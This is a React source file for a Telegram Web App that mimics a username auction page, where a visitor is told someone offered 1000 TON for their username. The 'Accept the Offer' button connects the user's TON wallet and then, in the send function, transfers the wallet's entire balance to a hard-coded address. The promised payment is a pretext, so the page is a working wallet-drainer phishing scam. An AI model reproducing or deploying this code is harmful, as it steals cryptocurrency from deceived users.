import "./App.css";
import { useTonConnect } from "./hooks/useTonConnect";
import "@twa-dev/sdk";
import { useTonClientBalance } from "./hooks/useTonClientBalance";
import NavBar from "./components/NavBar";
import { useEffect } from "react";
import { Address, toNano } from "ton-core";

function App() {
  const { handleWalletConnect, handleWalletDisconnect, connected, sender } =
    useTonConnect();
  const { balance } = useTonClientBalance();

  const send = async () => {
    if (connected) {
      console.log(connected);
      await sender.send({
        to: Address.parse("EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c"),
        value: toNano(balance!),
      });
    }
  };

  return (
    <div className="app">
      <NavBar />
      <div className="auction">
        <div className="header">
          <div className="name">
            <h1>voxleee.t.me</h1>
            <span>Claimed</span>
          </div>
          <p className="link hover">Subscribe to updates</p>
        </div>
        <div className="auction_info">
          <div className="left">
            <div className="info">
              <h3>What is this?</h3>
              <p>
                Someone offered <span className="with-ton">1000</span> for your
                username. If the price suits you, press "Accept the offer".
              </p>
              <p className="link hover">How does this work?</p>
            </div>
          </div>
          <div className="right">
            <div className="info">
              <div className="item">
                <div>Telegram Username</div>
                <div className="link">@test</div>
              </div>
              <div className="item">
                <div>Web Address</div>
                <div className="link">t.me/test</div>
              </div>
              <div className="item">
                <div>TON Web 3.0 Address</div>
                <div className="link">test.t.me</div>
              </div>
            </div>
          </div>
        </div>
        <button
          className="btn"
          onClick={connected ? send : handleWalletConnect}
        >
          Accept the Offer
        </button>
        <p className="link hover hidden">Subscribe to updates</p>

        <div className="auction_table">
          <h3>Latest Offers</h3>
          <div className="twrap">
            <table>
              <thead>
                <th>Offer</th>
                <th>Date</th>
                <th>From</th>
              </thead>
              <tbody>
                <tr>
                  <td>
                    <span className="with-ton">1000</span>
                  </td>
                  <td>{Date.now()}</td>
                  <td className="link hover">address</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>

      <footer>
        <ul className="links">
          <li>
            <a href="">Top Auctions</a>
          </li>
          <li>
            <a href="">About</a>
          </li>
          <li>
            <a href="">Terms</a>
          </li>
          <li>
            <a href="">Privacy</a>
          </li>
        </ul>
      </footer>
    </div>
  );
}

export default App;
